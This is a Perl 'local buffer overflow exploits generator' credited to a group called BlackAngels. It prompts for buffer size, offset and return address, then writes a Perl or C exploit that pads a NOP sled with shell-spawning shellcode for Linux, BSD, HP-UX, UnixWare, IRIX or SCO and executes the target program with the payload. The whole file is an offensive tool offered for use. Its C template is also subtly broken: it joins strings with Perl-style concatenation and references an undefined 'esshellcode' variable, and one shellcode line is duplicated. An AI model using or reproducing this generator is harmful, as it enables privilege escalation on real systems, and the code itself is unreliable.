#!/usr/bin/perl

##
#   Local buffer overflow exploits generator 1.1
#
#   Legal notes :
#   The BlackAngels staff refuse all responsabilities 
#   for an incorrect or illegal use of this software 
#   or for eventual damages to others systems.
#
#   http://www.blackangels.it
##



print "\n\n+====================================================================+\n";
print "|                                                                    |\n";
print "|         [ Local buffer overflow exploits generator 1.1 ]           |\n";
print "|      for Linux, FreeBSD, iBSD, HP-UX, UnixWare, IRIX and SCO       |\n";
print "|                                                                    |\n";
print "| Legal notes :                                                      |\n";
print "| The BlackAngels staff refuse all responsabilities for an incorrect |\n";
print "| or illegal use of this software or for eventual damages to others  |\n";
print "| systems.                                                           |\n";
print "|                                                                    |\n";
print "| This software could generate buffer overflow's exploits for        |\n";
print "| Linux, BSD, HP-UX, UnixWare, IRIX and SCO systems, in two          |\n";
print "| different languages ( c and perl ).                                |\n";
print "|                                                                    |\n";
print "|                   [ http://www.BlackAngels.it ]                    |\n";
print "|                                                                    |\n";
print "+====================================================================+\n\n\n";

print "Language [Perl=1, C=2] : ";
$language=<STDIN>;
chomp $language;

if ( $language eq "1" ) {

print "\nProgram location [Default = /bin/sh] : ";
$vulnlocate=<STDIN>;
print "Buffer size, leave blank for default [Default = 1024] : ";
$buffersize=<STDIN>;
print "Offset, leave blank for default [Default = 0] : ";
$offset=<STDIN>;
print "Return address : ";
$retaddrs=<STDIN>;
print "Exploit's parameters, leave blank for none [Ex. -x] : ";
$parameters=<STDIN>;
print "Operative system\n[Linux=1, FreeBSD=2, iBSD=3, HP-UX=4, UnixWare=5, IRIX=6, SCO=7] : ";
$operativesys=<STDIN>;
print "Exploit's name [Default = localoverflow] : ";
$expname=<STDIN>;

chomp $vulnlocate;
chomp $buffersize;
chomp $offset;
chomp $retaddrs;
chomp $parameters;
chomp $operativesys;
chomp $expname;

if ( $expname eq "" ) {
$expname="localoverflow"
}
if ( $vulnlocate eq "" ) {
$vulnlocate="/bin/sh";
}
if ( $buffersize eq "" ) {
$buffersize="1024";
}
if ( $offset eq "" ) {
$offset="0";
}

open(exploitcode, ">>".$expname.".pl");

print exploitcode "
\#!/usr/bin/perl

\# Exploit code generated with :
\# \"Local buffer overflow exploits generator 1.1\"
\#
\# Legal notes :
\# The BlackAngels staff refuse all responsabilities for an incorrect 
\# or illegal use of this software or for eventual damages to others systems.
\#
\# [ http://www.BlackAngels.it ]

\$shellcode = \n";

if ( $operativesys eq "1" ) {
print exploitcode  "\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" .\n";
print exploitcode  "\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" .\n";
print exploitcode  "\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n";
}
if ( $operativesys eq "2" ) {
print exploitcode  "\"\\xeb\\x37\\x5e\\x31\\xc0\\x88\\x46\\xfa\\x89\\x46\\xf5\\x89\\x36\\x89\\x76\" .\n";
print exploitcode  "\"\\x89\\x46\\x0c\\x88\\x46\\x17\\x88\\x46\\x1a\\x88\\x46\\x1d\\x50\\x56\\xff\" .\n";
print exploitcode  "\"\\x89\\x46\\x0c\\x88\\x46\\x17\\x88\\x46\\x1a\\x88\\x46\\x1d\\x50\\x56\\xff\" .\n";
print exploitcode  "\"\\x36\\xb0\\x3b\\x50\\x90\\x9a\\x01\\x01\\x01\\x01\\x07\\x07\\xe8\\xc4\\xff\" .\n";
print exploitcode  "\"\\xff\\xff\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\" .\n";
print exploitcode  "\"\\x02\\x02\\x02/bin/sh.-c.sh\";\n";
}
if ( $operativesys eq "3" ) {
print exploitcode  "\"\\xeb\\x1f\\x5e\\x31\\xc0\\x89\\x46\\xf5\\x88\\x46\\xfa\\x89\\x46\\x0c\\x89\\x76\" .\n";
print exploitcode  "\"\\x08\\x50\\x8d\\x5e\\x08\\x53\\x56\\x56\\xb0\\x3b\\x9a\\xff\\xff\\xff\\xff\\x07\" .\n";
print exploitcode  "\"\\xff\\xe8\\xdc\\xff\\xff\\xff/bin/sh\\x00\";\n";
}
if ( $operativesys eq "4" ) {
print exploitcode  "\"\\xe8\\x3f\\x1f\\xfd\\x08\\x21\\x02\\x80\\x34\\x02\\x01\\x02\\x08\\x41\\x04\\x02\\x60\\x40\" .\n";
print exploitcode  "\"\\x01\\x62\\xb4\\x5a\\x01\\x54\\x0b\\x39\\x02\\x99\\x0b\\x18\\x02\\x98\\x34\\x16\\x04\\xbe\" .\n";
print exploitcode  "\"\\x20\\x20\\x08\\x01\\xe4\\x20\\xe0\\x08\\x96\\xd6\\x05\\x34\\xde\\xad\\xca\\xfe/bin/sh\\xff\";\n";
}
if ( $operativesys eq "5" ) {
print exploitcode  "\"\\xeb\\x48\\x9a\\xff\\xff\\xff\\xff\\x07\\xff\\xc3\\x5e\\x31\\xc0\\x89\\x46\\xb4\" .\n";
print exploitcode  "\"\\x88\\x46\\xb9\\x88\\x46\\x07\\x89\\x46\\x0c\\x31\\xc0\\x50\\xb0\\x8d\\xe8\\xdf\" .\n";
print exploitcode  "\"\\xff\\xff\\xff\\x83\\xc4\\x04\\x31\\xc0\\x50\\xb0\\x17\\xe8\\xd2\\xff\\xff\\xff\" .\n";
print exploitcode  "\"\\x83\\xc4\\x04\\x31\\xc0\\x50\\x8d\\x5e\\x08\\x53\\x8d\\x1e\\x89\\x5e\\x08\\x53\" .\n";
print exploitcode  "\"\\xb0\\x3b\\xe8\\xbb\\xff\\xff\\xff\\x83\\xc4\\x0c\\xe8\\xbb\\xff\\xff\\xff\\x2f\" .\n";
print exploitcode  "\"\\x62\\x69\\x6e\\x2f\\x73\\x68\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\";\n";
}
if ( $operativesys eq "6" ) {
print exploitcode  "\"\\x04\\x10\\xff\\xff\\x24\\x02\\x03\\xf3\\x23\\xff\\x02\\x14\\x23\\xe4\\xfe\" .\n";
print exploitcode  "\"\\x08\\x23\\xe5\\xfe\\x10\\xaf\\xe4\\xfe\\x10\\xaf\\xe0\\xfe\\x14\\xa3\\xe0\" .\n";
print exploitcode  "\"\\xfe\\x0f\\x03\\xff\\xff\\xcc/bin/sh\";\n";
}
if ( $operativesys eq "7" ) {
print exploitcode  "\"\\xeb\\x1b\\x5e\\x31\\xdb\\x89\\x5e\\x07\\x89\\x5e\\x0c\\x88\\x5e\\x11\\x31\\xc0\" .\n";
print exploitcode  "\"\\xb0\\x3b\\x8d\\x7e\\x07\\x89\\xf9\\x53\\x51\\x56\\x56\\xeb\\x10\\xe8\\xe0\\xff\" .\n";
print exploitcode  "\"\\xff\\xff/bin/sh\\xaa\\xaa\\xaa\\xaa\\x9a\\xaa\\xaa\\xaa\\xaa\\x07\\xaa\";\n";
}

print exploitcode "
\$bsize = $buffersize;
\$retaddr = $retaddrs;
\$nop = \"\\x90\";
\$offset = $offset;

for (\$i = 0; \$i < (\$bsize - length(\$shellcode) - 4); \$i++) {
\$buffer .= \$nop;
}

\$buffer .= \$shellcode;
print \"Using address : 0x\", sprintf('\%lx',(\$retaddr + \$offset)), \"\\n\";
\$newret = pack('l', (\$retaddr + \$offset));
for (\$i += length(\$shellcode); \$i < \$bsize; \$i += 4) {
\$buffer .= \$newret;
}\n";

if ( $parameters eq "" ) {
print exploitcode "exec(\"$vulnlocate \$buffer\");"; 
}
else {
print exploitcode "exec(\"$vulnlocate $parameters \$buffer\");";
}

close(exploitcode);

}
else {

print "\nProgram location [Default = /bin/sh] : ";
$vulnlocate=<STDIN>;
print "Program name : ";
$vulnprg=<STDIN>;
print "Buffer size, leave blank for default [Default = 1024] : ";
$buffersize=<STDIN>;
print "Offset, leave blank for default [Default = 0] : ";
$offset=<STDIN>;
print "Align, leave blank for default [Default = 0] : ";
$allign=<STDIN>;
print "Exploit's parameters, leave blank for none [Ex. -x] : ";
$parameters=<STDIN>;
print "Operative system\n[Linux=1, FreeBSD=2, iBSD=3, HP-UX=4, UnixWare=5, IRIX=6, SCO=7] : ";
$operativesys=<STDIN>;
print "Exploit's name [Default = localoverflow] : ";
$expname=<STDIN>;

chomp $vulnprg;
chomp $vulnlocate;
chomp $buffersize;
chomp $offset;
chomp $allign;
chomp $parameters;
chomp $operativesys;
chomp $expname;

if ( $expname eq "" ) {
$expname="localoverflow"
}
if ( $vulnlocate eq "" ) {
$vulnlocate="/bin/sh";
}
if ( $buffersize eq "" ) {
$buffersize="1024";
}
if ( $offset eq "" ) {
$offset="0";
}
if ( $allign eq "" ) {
$allign="0";
}

open(exploitcode, ">>".$expname.".c");

print exploitcode "
/*

Exploit code generated with :
\"Local buffer overflow exploits generator 1.1\"

Legal notes :
The BlackAngels staff refuse all responsabilities for an incorrect 
or illegal use of this software or for eventual damages to others systems.

[ http://www.BlackAngels.it ]

*/

\#include <stdio.h>
\#include <stdlib.h>
\#include <unistd.h>

\#define BSIZE $buffersize
\#define ALIGN $allign
\#define OFFSET $offset
\#define NOP 0x90

unsigned char shellcode[] =\n";

if ( $operativesys eq "1" ) {
print exploitcode  "\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" .\n";
print exploitcode  "\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" .\n";
print exploitcode  "\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n";
}
if ( $operativesys eq "2" ) {
print exploitcode  "\"\\xeb\\x37\\x5e\\x31\\xc0\\x88\\x46\\xfa\\x89\\x46\\xf5\\x89\\x36\\x89\\x76\" .\n";
print exploitcode  "\"\\x89\\x46\\x0c\\x88\\x46\\x17\\x88\\x46\\x1a\\x88\\x46\\x1d\\x50\\x56\\xff\" .\n";
print exploitcode  "\"\\x89\\x46\\x0c\\x88\\x46\\x17\\x88\\x46\\x1a\\x88\\x46\\x1d\\x50\\x56\\xff\" .\n";
print exploitcode  "\"\\x36\\xb0\\x3b\\x50\\x90\\x9a\\x01\\x01\\x01\\x01\\x07\\x07\\xe8\\xc4\\xff\" .\n";
print exploitcode  "\"\\xff\\xff\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\" .\n";
print exploitcode  "\"\\x02\\x02\\x02/bin/sh.-c.sh\";\n";
}
if ( $operativesys eq "3" ) {
print exploitcode  "\"\\xeb\\x1f\\x5e\\x31\\xc0\\x89\\x46\\xf5\\x88\\x46\\xfa\\x89\\x46\\x0c\\x89\\x76\" .\n";
print exploitcode  "\"\\x08\\x50\\x8d\\x5e\\x08\\x53\\x56\\x56\\xb0\\x3b\\x9a\\xff\\xff\\xff\\xff\\x07\" .\n";
print exploitcode  "\"\\xff\\xe8\\xdc\\xff\\xff\\xff/bin/sh\\x00\";\n";
}
if ( $operativesys eq "4" ) {
print exploitcode  "\"\\xe8\\x3f\\x1f\\xfd\\x08\\x21\\x02\\x80\\x34\\x02\\x01\\x02\\x08\\x41\\x04\\x02\\x60\\x40\" .\n";
print exploitcode  "\"\\x01\\x62\\xb4\\x5a\\x01\\x54\\x0b\\x39\\x02\\x99\\x0b\\x18\\x02\\x98\\x34\\x16\\x04\\xbe\" .\n";
print exploitcode  "\"\\x20\\x20\\x08\\x01\\xe4\\x20\\xe0\\x08\\x96\\xd6\\x05\\x34\\xde\\xad\\xca\\xfe/bin/sh\\xff\";\n";
}
if ( $operativesys eq "5" ) {
print exploitcode  "\"\\xeb\\x48\\x9a\\xff\\xff\\xff\\xff\\x07\\xff\\xc3\\x5e\\x31\\xc0\\x89\\x46\\xb4\" .\n";
print exploitcode  "\"\\x88\\x46\\xb9\\x88\\x46\\x07\\x89\\x46\\x0c\\x31\\xc0\\x50\\xb0\\x8d\\xe8\\xdf\" .\n";
print exploitcode  "\"\\xff\\xff\\xff\\x83\\xc4\\x04\\x31\\xc0\\x50\\xb0\\x17\\xe8\\xd2\\xff\\xff\\xff\" .\n";
print exploitcode  "\"\\x83\\xc4\\x04\\x31\\xc0\\x50\\x8d\\x5e\\x08\\x53\\x8d\\x1e\\x89\\x5e\\x08\\x53\" .\n";
print exploitcode  "\"\\xb0\\x3b\\xe8\\xbb\\xff\\xff\\xff\\x83\\xc4\\x0c\\xe8\\xbb\\xff\\xff\\xff\\x2f\" .\n";
print exploitcode  "\"\\x62\\x69\\x6e\\x2f\\x73\\x68\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\";\n";
}
if ( $operativesys eq "6" ) {
print exploitcode  "\"\\x04\\x10\\xff\\xff\\x24\\x02\\x03\\xf3\\x23\\xff\\x02\\x14\\x23\\xe4\\xfe\" .\n";
print exploitcode  "\"\\x08\\x23\\xe5\\xfe\\x10\\xaf\\xe4\\xfe\\x10\\xaf\\xe0\\xfe\\x14\\xa3\\xe0\" .\n";
print exploitcode  "\"\\xfe\\x0f\\x03\\xff\\xff\\xcc/bin/sh\";\n";
}
if ( $operativesys eq "7" ) {
print exploitcode  "\"\\xeb\\x1b\\x5e\\x31\\xdb\\x89\\x5e\\x07\\x89\\x5e\\x0c\\x88\\x5e\\x11\\x31\\xc0\" .\n";
print exploitcode  "\"\\xb0\\x3b\\x8d\\x7e\\x07\\x89\\xf9\\x53\\x51\\x56\\x56\\xeb\\x10\\xe8\\xe0\\xff\" .\n";
print exploitcode  "\"\\xff\\xff/bin/sh\\xaa\\xaa\\xaa\\xaa\\x9a\\xaa\\xaa\\xaa\\xaa\\x07\\xaa\";\n";
}

print exploitcode  "	
unsigned long get_sp(void) {
__asm__(\"movl %esp, %eax\");
}

int main(\int argc, char **argv) {

char *buffer;
int i;
int bsize = BSIZE;
int align = ALIGN;
int offset = OFFSET;
unsigned long addr;

\if(argc > 1) bsize = atoi(argv[1]);

buffer = (char *)malloc(bsize);
bzero(buffer, bsize);
memset(buffer, NOP, bsize);
addr = get_sp() - offset;

*(unsigned long *)&buffer[bsize - 4] = addr;
*(unsigned long *)&buffer[bsize - 8] = addr;

memcpy(buffer + bsize - 8 - align - strlen(esshellcode), esshellcode, strlen(esshellcode));\n";

if ( $parameters eq "" ) {
print exploitcode "execl(\"$vulnlocate\", \"$vulnprg\", buffer, NULL);}"; 
}
else {
print exploitcode "execl(\"$vulnlocate\", \"$vulnprg\", \"$parameters\", buffer, NULL);}";
}

close(exploitcode);

}